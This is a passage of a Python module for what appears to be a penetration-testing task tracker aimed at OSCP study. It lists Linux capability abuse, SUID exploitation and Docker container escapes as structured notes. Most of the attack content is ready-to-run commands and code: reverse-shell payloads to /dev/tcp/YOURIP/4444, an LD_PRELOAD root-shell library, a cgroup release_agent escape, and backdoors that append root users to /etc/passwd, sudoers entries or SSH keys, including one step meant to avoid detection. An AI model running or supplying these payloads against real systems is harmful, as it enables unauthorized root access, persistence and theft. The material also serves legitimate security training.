                            '- FTP credentials (USER/PASS in plaintext)',
                            '- SSH passwords (encrypted but version info useful)',
                            '- Database connections with credentials'
                        ],
                        'alternatives': [
                            'tcpdump -i any -A | grep -E "Authorization:|USER |PASS "',
                            'Manual: Monitor /var/log/auth.log for authentication attempts'
                        ],
                        'estimated_time': '10+ minutes (capture time)'
                    }
                },
                # CAP_NET_ADMIN
                {
                    'id': 'cap-net-admin-exploit',
                    'name': 'CAP_NET_ADMIN + CAP_NET_RAW Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enable promiscuous mode for network sniffing',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'notes': [
                            'CAP_NET_ADMIN allows network interface configuration',
                            'Combined with CAP_NET_RAW enables promiscuous mode sniffing',
                            '',
                            'Python iptables manipulation:',
                            'import iptc',
                            '# Dump firewall rules',
                            r'json = iptc.easy.dump_table(\'filter\', ipv6=False)',
                            'print(json)',
                            '',
                            '# Flush iptables (remove restrictions)',
                            r'iptc.easy.flush_table(\'filter\')',
                            '',
                            'Enable interface promiscuous mode:',
                            'ip link set eth0 promisc on',
                            'ifconfig eth0 promisc',
                            '',
                            'Not typically direct privilege escalation but useful for:',
                            '- Bypassing network restrictions',
                            '- Sniffing other containers/VMs traffic',
                            '- Credential harvesting'
                        ],
                        'alternatives': [
                            'Manual: ip link set dev eth0 promisc on',
                            'tcpdump -i any -p (disable promiscuous mode)'
                        ],
                        'estimated_time': '5 minutes'
                    }
                },
                # CAP_LINUX_IMMUTABLE
                {
                    'id': 'cap-linux-immutable-exploit',
                    'name': 'CAP_LINUX_IMMUTABLE Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Remove immutable attribute from protected files',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'notes': [
                            'CAP_LINUX_IMMUTABLE allows modifying immutable and append-only flags',
                            '',
                            'Check if file is immutable:',
                            'lsattr /etc/passwd',
                            '----i---------e--- /etc/passwd',
                            '',
                            'Python removal of immutable flag:',
                            'import fcntl, os, struct',
                            '',
                            'FS_APPEND_FL = 0x00000020',
                            'FS_IOC_SETFLAGS = 0x40086602',
                            '',
                            r'fd = os.open(\'/etc/passwd\', os.O_RDONLY)',
                            r'f = struct.pack(\'i\', FS_APPEND_FL)',
                            'fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)',
                            '',
                            '# Now file is modifiable',
                            'with open("/etc/passwd", "a") as f:',
                            '    f.write("newroot:x:0:0::/root:/bin/bash\\n")',
                            '',
                            'Normal method (requires chattr):',
                            'chattr -i /etc/passwd',
                            'echo "newroot:x:0:0::/root:/bin/bash" >> /etc/passwd',
                            'chattr +i /etc/passwd  # Restore to avoid detection'
                        ],
                        'alternatives': [
                            'Remove append-only flag: chattr -a /var/log/auth.log',
                            'Manual: Check lsattr output for +i or +a flags'
                        ],
                        'estimated_time': '5 minutes'
                    }
                },
                # CAP_SYS_RAWIO
                {
                    'id': 'cap-sys-rawio-exploit',
                    'name': 'CAP_SYS_RAWIO Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Direct disk/memory access for privilege escalation',
                        'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                        'notes': [
                            'CAP_SYS_RAWIO allows access to /dev/mem, /dev/kmem, ioperm(), iopl()',
                            '',
                            'Direct memory access:',
                            '# Read physical memory',
                            'dd if=/dev/mem of=/tmp/mem.dump bs=1M count=100',
                            '',
                            '# Search for credentials in memory',
                            'strings /tmp/mem.dump | grep -E "password|secret|token"',
                            '',
                            'Direct disk access:',
                            '# Read raw disk (bypass permissions)',
                            'dd if=/dev/sda of=/tmp/disk.img bs=1M count=1000',
                            '',
                            '# Mount disk image',
                            'mkdir /tmp/mnt',
                            'mount -o loop /tmp/disk.img /tmp/mnt',
                            '# Access filesystem with full permissions',
                            'cat /tmp/mnt/etc/shadow',
                            '',
                            'Highly dangerous capability - near root-equivalent'
                        ],
                        'alternatives': [
                            'Use /dev/kmem for kernel memory',
                            'Access /proc/kcore for kernel memory dump',
                            'Use debugfs to modify ext4 filesystem'
                        ],
                        'estimated_time': '15 minutes'
                    }
                },
                # CAP_KILL
                {
                    'id': 'cap-kill-exploit',
                    'name': 'CAP_KILL Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Kill processes and send signals for exploitation',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'notes': [
                            'CAP_KILL allows sending signals to any process',
                            '',
                            'Node.js debugger activation (if node running as root):',
                            'ps aux | grep node',
                            'kill -SIGUSR1 <node-pid>',
                            '# Opens debugger on ws://127.0.0.1:9229/...',
                            '',
                            'Connect to debugger:',
                            'chrome://inspect',
                            '# Or use node inspect',
                            '',
                            'Execute arbitrary code in debugger:',
                            r'require(\'child_process\').exec(\'chmod +s /bin/bash\')',
                            '',
                            'Python kill example:',
                            'import os, signal',
                            'pgid = os.getpgid(1234)',
                            'os.killpg(pgid, signal.SIGUSR1)',
                            '',
                            'Other exploitation vectors:',
                            '- Kill service, replace binary, restart',
                            '- Send SIGHUP to reload configuration files you modified',
                            '- Kill cron daemon after planting cron job'
                        ],
                        'alternatives': [
                            'kill -s SIGUSR1 <pid>',
                            'Manual: pkill node; start backdoored version',
                            'killall -SIGHUP sshd (reload after modifying config)'
                        ],
                        'estimated_time': '10 minutes'
                    }
                },
                # CAP_SYS_CHROOT
                {
                    'id': 'cap-sys-chroot-exploit',
                    'name': 'CAP_SYS_CHROOT Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Escape chroot jails using known techniques',
                        'tags': ['EXPLOIT', 'OSCP:LOW'],
                        'notes': [
                            'CAP_SYS_CHROOT allows using chroot(2) syscall',
                            'Can be used to escape existing chroot jails',
                            '',
                            'Classic chroot escape:',
                            'mkdir /tmp/newroot',
                            'chroot /tmp/newroot',
                            '# Multiple chroot() calls can escape jail',
                            '',
                            'Tools:',
                            '- chw00t: https://github.com/earthquake/chw00t/',
                            '- Various escape techniques: https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf',
                            '',
                            'Not commonly exploitable alone but useful in combination'
                        ],
                        'alternatives': [
                            'Manual directory traversal: cd .. repeatedly',
                            'Use file descriptors to escape'
                        ],
                        'estimated_time': '15 minutes'
                    }
                },
                # CAP_MKNOD
                {
                    'id': 'cap-mknod-exploit',
                    'name': 'CAP_MKNOD Exploitation (Container Escape)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create block device to read host disk from container',
                        'tags': ['EXPLOIT', 'OSCP:MEDIUM', 'CONTAINER_ESCAPE'],
                        'notes': [
                            'CAP_MKNOD allows creating device files (block/character)',
                            'Default Docker capability - can escape with shared user namespace',
                            '',
                            'Requirements:',
                            '1. CAP_MKNOD in container (default)',
                            '2. Container shares host user namespace',
                            '3. Root (EUID 0) inside container',
                            '',
                            'Step 1: Find target device on host',
                            '# On host: ls -l /dev/sda',
                            'brw-rw---- 1 root disk 8, 0 Jan 1 /dev/sda',
                            '# Major:Minor = 8:0',
                            '',
                            'Step 2: Inside container as root',
                            'mknod /dev/sda b 8 0',
                            'chmod 660 /dev/sda',
                            '',
                            'Step 3: Add host user to container',
                            'useradd -u 1000 hostuser  # Match host UID',
                            'su hostuser',
                            '',
                            'Step 4: On host (as standard user)',
                            'ps aux | grep container',
                            'head /proc/<container-pid>/root/dev/sda',
                            '# Can now read host disk!',
                            '',
                            'Extract data:',
                            'dd if=/proc/<pid>/root/dev/sda of=/tmp/disk.img bs=1M count=100'
                        ],
                        'alternatives': [
                            'Create /dev/sda1 for specific partition',
                            'Create /dev/mem for direct memory access (if CAP_SYS_RAWIO)',
                            'Manual: mknod /dev/disk b <major> <minor>'
                        ],
                        'estimated_time': '15 minutes'
                    }
                }
            ]
        }

    def _get_suid_exploitation_tasks(self) -> Dict[str, Any]:
        """SUID/EUID exploitation techniques"""
        return {
            'id': 'suid-exploitation',
            'name': 'Phase 3: SUID/EUID Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'suid-understand-uids',
                    'name': 'Understanding UID Variables',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Learn RUID, EUID, SUID concepts for SUID exploitation',
                        'tags': ['EDUCATION', 'OSCP:MEDIUM'],
                        'notes': [
                            'UID Variable Definitions:',
                            '- ruid (Real UID): User who started the process',
                            '- euid (Effective UID): Used by system to check permissions',
                            '- suid (Saved UID): Allows process to drop/regain privileges',
                            '',
                            'SUID Binary Behavior:',
                            'When you execute a SUID binary:',
                            '- ruid = your user (e.g., 1000)',
                            '- euid = file owner (e.g., 0 for root)',
                            '- suid = file owner (e.g., 0)',
                            '',
                            'Key Function Behaviors:',
                            '- setuid(0): Sets euid to 0 (if privileged). For root, sets all UIDs.',
                            '- setreuid(ruid, euid): Set ruid and euid explicitly',
                            '- setresuid(ruid, euid, suid): Set all three UIDs',
                            '',
                            'Non-root process can only set euid to current ruid, euid, or suid',
                            '',
                            'Bash -p flag: Preserves euid (default: bash sets euid=ruid)',
                            '',
                            'Reference: https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html'
                        ],
                        'estimated_time': '5 minutes'
                    }
                },
                {
                    'id': 'suid-system-vs-execve',
                    'name': 'Exploiting system() vs execve() in SUID Binaries',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand exploitation differences between system() and execve()',
                        'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                        'notes': [
                            'Two common patterns in SUID binaries:',
                            '',
                            '1. Binary uses system():',
                            '   system("id") executes: /bin/sh -c "id"',
                            '   - If /bin/sh -> bash: bash drops privileges (sets euid=ruid)',
                            '   - Result: runs as your user, not root',
                            '   - Exploitation: PATH hijacking if command not absolute',
                            '',
                            '2. Binary uses execve():',
                            '   execve("/usr/bin/id", ...) directly executes id',
                            '   - Preserves euid (remains elevated)',
                            '   - If calls bash: need "bash -p" to keep euid',
                            '   - Result: can maintain root privileges',
                            '',
                            'Exploitation Strategies:',
                            '',
                            'For system() calls:',
                            '- PATH injection: export PATH=/tmp:$PATH',
                            '- Create malicious binary in /tmp',
                            '- Example: echo "bash -p" > /tmp/id && chmod +x /tmp/id',
                            '',
                            'For execve() with shell:',
                            '- If binary calls execve("/bin/bash", ...)',
                            '- Ensure arguments include "-p" to preserve privileges',
                            '- Example: ./suid_binary --shell=/bin/bash --args=-p',
                            '',
                            'Testing a SUID binary:',
                            'strings /path/to/suid_binary | grep -E "system|exec"',
                            'ltrace ./suid_binary 2>&1 | grep -E "system|exec"',
                            '',
                            'Experiment with setuid() vs setreuid():',
                            '- setuid(1000) + system(): drops to user 1000',
                            '- setreuid(1000,1000) + system(): also drops to 1000',
                            '- setuid(1000) + execve(bash): euid remains root without -p',
                            '',
                            'Key Insight: Bash behavior is critical!',
                            '- bash without -p: sets euid = ruid (drops privileges)',
                            '- bash -p: preserves initial euid (keeps privileges)',
                            '- sh (dash): similar to bash, drops privileges',
                            ''
                        ],
                        'alternatives': [
                            'Manual testing: Create test SUID binaries with different approaches',
                            'Use strace to trace system calls: strace ./suid_binary',
                            'Ghidra/IDA: Reverse engineer to find system()/execve() calls'
                        ],
                        'estimated_time': '15 minutes'
                    }
                },
                {
                    'id': 'suid-path-hijack',
                    'name': 'SUID Binary PATH Hijacking',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit SUID binaries that use relative command paths',
                        'tags': ['EXPLOIT', 'OSCP:HIGH', 'QUICK_WIN'],
                        'notes': [
                            'If SUID binary calls commands without absolute paths:',
                            '',
                            'Step 1: Identify vulnerable binary',
                            'strings /usr/local/bin/suid_binary | grep -v "^/"',
                            '# Look for: ls, cat, echo, id (no leading /)',
                            '',
                            'Or use ltrace:',
                            'ltrace ./suid_binary 2>&1 | grep system',
                            'system("ls /tmp")  # VULNERABLE',
                            '',
                            'Step 2: Create malicious command',
                            'echo "bash -p" > /tmp/ls',
                            'chmod +x /tmp/ls',
                            '',
                            'Step 3: Hijack PATH',
                            'export PATH=/tmp:$PATH',
                            '',
                            'Step 4: Execute SUID binary',
                            './suid_binary',
                            '# Now running bash as root!',
                            '',
                            'Alternative payload for persistence:',
                            'echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /tmp/ls',
                            '',
                            'Common vulnerable patterns:',
                            '- system("ls " + user_input)',
                            '- system("cat file.txt")',
                            '- system("ps aux | grep ...")',
                            '',
                            'Defense: Always use absolute paths in SUID binaries!'
                        ],
                        'alternatives': [
                            'LD_PRELOAD hijacking if binary uses dynamic libraries',
                            'Command injection if binary concatenates user input',
                            'Symlink attacks if binary follows symlinks'
                        ],
                        'estimated_time': '10 minutes'
                    }
                },
                {
                    'id': 'suid-command-injection',
                    'name': 'SUID Binary Command Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject commands into SUID binary that uses user input unsafely',
                        'tags': ['EXPLOIT', 'OSCP:HIGH'],
                        'notes': [
                            'If SUID binary takes user input and passes to shell:',
                            '',
                            'Example vulnerable code:',
                            'system("ping -c 1 " + user_input);',
                            '',
                            'Exploitation:',
                            './suid_binary "127.0.0.1; bash -p"',
                            './suid_binary "127.0.0.1 && bash -p"',
                            './suid_binary "127.0.0.1 | bash -p"',
                            './suid_binary "127.0.0.1; chmod +s /bin/bash"',
                            '',
                            'Command separators:',
                            '; - Execute sequentially',
                            '&& - Execute if previous succeeds',
                            '|| - Execute if previous fails',
                            '| - Pipe output to next command',
                            '$() - Command substitution',
                            '` ` - Command substitution (backticks)',
                            '',
                            'Testing for injection:',
                            './suid_binary "test; sleep 5"  # If delays, vulnerable',
                            './suid_binary "test && id > /tmp/test"  # Check /tmp/test',
                            '',
                            'Reverse shell payload:',
                            r'./suid_binary "x; bash -c \'bash -i >& /dev/tcp/YOURIP/4444 0>&1\'"',
                            '',
                            'Create SUID bash:',
                            './suid_binary "x; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"',
                            '/tmp/rootbash -p'
                        ],
                        'alternatives': [
                            'Try environment variable injection: USER="$(bash -p)"',
                            'File path injection if binary opens files',
                            'Format string exploitation in printf-style functions'
                        ],
                        'estimated_time': '10 minutes'
                    }
                },
                {
                    'id': 'suid-ld-preload',
                    'name': 'LD_PRELOAD Exploitation with SUID',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Load malicious shared library before SUID binary executes',
                        'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                        'notes': [
                            'LD_PRELOAD loads shared library before program execution',
                            'Normally ignored for SUID binaries (security)',
                            '',
                            'Exploitable if:',
                            '1. You can modify SUID binary environment',
                            '2. Binary has LD_PRELOAD in environment',
                            '3. sudo with env_keep+=LD_PRELOAD (check sudo -l)',
                            '',
                            'Step 1: Create malicious library (preload.c)',
                            '#include <stdio.h>',
                            '#include <stdlib.h>',
                            '#include <unistd.h>',
                            '',
                            'void _init() {',
                            '    unsetenv("LD_PRELOAD");',
                            '    setuid(0);',
                            '    setgid(0);',
                            '    system("/bin/bash -p");',
                            '}',
                            '',
                            'Step 2: Compile',
                            'gcc -fPIC -shared -o /tmp/preload.so preload.c -nostartfiles',
                            '',
                            'Step 3: Execute with LD_PRELOAD',
                            'LD_PRELOAD=/tmp/preload.so ./suid_binary',
                            '',
                            'For sudo with env_keep+=LD_PRELOAD:',
                            'sudo LD_PRELOAD=/tmp/preload.so <allowed_program>',
                            '',
                            'Check if vulnerable:',
                            'sudo -l | grep LD_PRELOAD',
                            'env_keep+=LD_PRELOAD  # VULNERABLE'
                        ],
                        'alternatives': [
                            'LD_LIBRARY_PATH exploitation (similar technique)',
                            'Overwrite .so files loaded by SUID binary',
                            'Manual: ldd ./suid_binary to see loaded libraries'
                        ],
                        'estimated_time': '15 minutes'
                    }
                }
            ]
        }

    def _get_container_escape_tasks(self) -> Dict[str, Any]:
        """Docker/Container escape techniques"""
        return {
            'id': 'container-escape',
            'name': 'Phase 4: Docker/Container Escape Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': 'container-detect',
                    'name': 'Detect Container Environment',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /proc/1/cgroup | grep -E "docker|lxc|kubepods" && echo "[+] Inside container"',
                        'description': 'Detect if running inside a container',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '/proc/1/cgroup': 'Control group file for init process (PID 1)',
                            'grep docker': 'Search for docker in cgroup path',
                            'kubepods': 'Kubernetes pod indicator'
                        },
                        'success_indicators': [
                            'docker or lxc found in cgroup paths',
                            '/.dockerenv file exists',
                            'PID 1 is not /sbin/init or systemd'
                        ],
                        'next_steps': [
                            'Check container capabilities: capsh --print',
                            'Look for host disk mounts: df -h',
                            'Check for docker socket: ls -la /var/run/docker.sock'
                        ],
                        'alternatives': [
                            'ls -la /.dockerenv',
                            'cat /proc/self/cgroup | grep docker',
                            'df -h | grep overlay',
                            'Manual: ps aux (if only few processes, likely container)'
                        ],
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': 'container-check-caps',
                    'name': 'Check Container Capabilities',
                    'type': 'command',
                    'metadata': {
                        'command': 'capsh --print | grep Current',
                        'description': 'List capabilities available in container',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'success_indicators': [
                            'CAP_SYS_ADMIN present (mount host disk)',
                            'CAP_DAC_OVERRIDE or CAP_DAC_READ_SEARCH (shocker exploit)',
                            'CAP_SYS_PTRACE (inject into host process)',
                            'CAP_SYS_MODULE (load kernel module)'
                        ],
                        'next_steps': [
                            'If CAP_SYS_ADMIN: try mounting host disk',
                            'If CAP_DAC_READ_SEARCH: try shocker exploit',
                            'If CAP_SYS_PTRACE: try process injection',
                            'If CAP_SYS_MODULE: try kernel module injection'
                        ],
                        'alternatives': [
                            'cat /proc/$$/status | grep Cap',
                            'docker inspect <container> (from host)',
                            'Run amicontained: docker run --rm -it r.j3ss.co/amicontained'
                        ],
                        'notes': 'Default Docker capabilities: chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap',
                        'estimated_time': '2 minutes'
                    }
                },
                {
                    'id': 'container-docker-sock',
                    'name': 'Docker Socket Escape',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Escape container with access to host docker socket',
                        'tags': ['EXPLOIT', 'OSCP:HIGH', 'CONTAINER_ESCAPE'],
                        'notes': [
                            'If /var/run/docker.sock mounted in container:',
                            '',
                            'Step 1: Verify docker socket access',
                            'ls -la /var/run/docker.sock',
                            'srw-rw---- 1 root docker /var/run/docker.sock',
                            '',
                            'Step 2: Check if docker client available',
                            'which docker',
                            '# If not: download static docker binary from GitHub',
                            '',
                            'Step 3: Escape by mounting host filesystem',
                            'docker run -v /:/hostfs -it ubuntu chroot /hostfs /bin/bash',
                            '',
                            'Alternative: Create privileged container',
                            'docker run --privileged -v /:/hostfs -it ubuntu',
                            'chroot /hostfs',
                            '',
                            'Step 4: On host filesystem',
                            '# Add SSH key',
                            'mkdir -p /root/.ssh',
                            'echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys',
                            '',
                            '# Or add user to sudoers',
                            'echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
                            '',
                            '# Or create SUID bash',
                            'cp /bin/bash /tmp/rootbash',
                            'chmod +s /tmp/rootbash',
                            '',
                            'Full Docker control = Full host control'
                        ],
                        'alternatives': [
                            'Use docker API directly with curl',
                            'Create container with host network namespace',
                            'Mount /proc from host to access host processes'
                        ],
                        'estimated_time': '10 minutes'
                    }
                },
                {
                    'id': 'container-privileged',
                    'name': 'Privileged Container Escape',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Escape from privileged Docker container',
                        'tags': ['EXPLOIT', 'OSCP:HIGH', 'CONTAINER_ESCAPE'],
                        'notes': [
                            'Privileged containers have almost all capabilities',
                            '',
                            'Check if privileged:',
                            'ip link add dummy0 type dummy',
                            '# If succeeds: container is privileged',
                            '',
                            'Method 1: Mount host disk',
                            'fdisk -l  # Find host disk',
                            'mkdir /mnt/host',
                            'mount /dev/sda1 /mnt/host',
                            'chroot /mnt/host /bin/bash',
                            '',
                            'Method 2: Write to cgroup (release_agent exploit)',
                            'd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`',
                            'mkdir -p $d/x',
                            'echo 1 > $d/x/notify_on_release',
                            r'host_path=`sed -n \'s/.*\perdir=\([^,]*\).*/\1/p\' /etc/mtab`',
                            'echo "$host_path/cmd" > $d/release_agent',
                            'echo "#!/bin/sh" > /cmd',
                            'echo "bash -i >& /dev/tcp/YOURIP/4444 0>&1" >> /cmd',
                            'chmod +x /cmd',
                            'sh -c "echo \\$\\$ > $d/x/cgroup.procs"',
                            '',
                            'Method 3: Kernel module injection (CAP_SYS_MODULE)',
                            '# See CAP_SYS_MODULE exploitation above',
                            '',
                            'Privileged containers are effectively root on host'
                        ],
                        'alternatives': [
                            'Abuse /proc/sys for host manipulation',
                            'Direct device access via /dev',
                            'Modify host crontab for persistence'
                        ],
                        'estimated_time': '15 minutes'
                    }
                }
            ]
        }

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Generate follow-up tasks based on completed task results"""
        follow_ups = []

        # If capabilities found, suggest exploitation
        if 'caps-scan-binaries' in task_id and 'cap_setuid' in result:
            follow_ups.append({
                'id': 'caps-setuid-followup',
                'name': 'Exploit CAP_SETUID Binary Found',
                'type': 'manual',
                'metadata': {
                    'description': 'CAP_SETUID capability detected - escalate to root',
                    'notes': 'Use CAP_SETUID exploitation techniques from task tree'
                }
            })

        return follow_ups

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Provide manual alternatives for tasks"""
        alternatives = {
            'caps-scan-binaries': [
                'Manual: Check common paths: getcap /usr/bin/* /usr/sbin/* /usr/local/bin/*',
                'Alternative: find / -type f -perm -4000 2>/dev/null (SUID binaries)'
            ],
            'cap-setuid-exploit': [
                'Manual: Use alternative interpreter if python unavailable',
                'Alternative: Compile C program with capability to spawn root shell'
            ]
        }
        return alternatives.get(task_id, ['Manual enumeration of capabilities'])
